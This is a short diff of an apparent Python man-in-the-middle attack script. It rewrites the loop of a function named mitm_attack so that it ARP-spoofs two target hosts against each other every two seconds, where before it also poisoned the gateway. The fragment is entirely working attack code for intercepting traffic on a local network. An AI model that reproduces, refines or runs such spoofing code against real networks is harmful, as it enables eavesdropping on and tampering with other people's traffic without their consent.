@@ -87,10 +87,8 @@ def mitm_attack(target_ip, target_2_ip, gateway_ip):
     try:
         print("[*] Starting MITM attack...")
         while True:
-            arp_spoof(target_ip, gateway_ip)
-            arp_spoof(gateway_ip, target_ip)
-            arp_spoof(target_2_ip, gateway_ip)
-            arp_spoof(gateway_ip, target_2_ip)
+            arp_spoof(target_ip, target_2_ip)
+            arp_spoof(target_2_ip, target_ip)
             time.sleep(2)
     
     except KeyboardInterrupt:
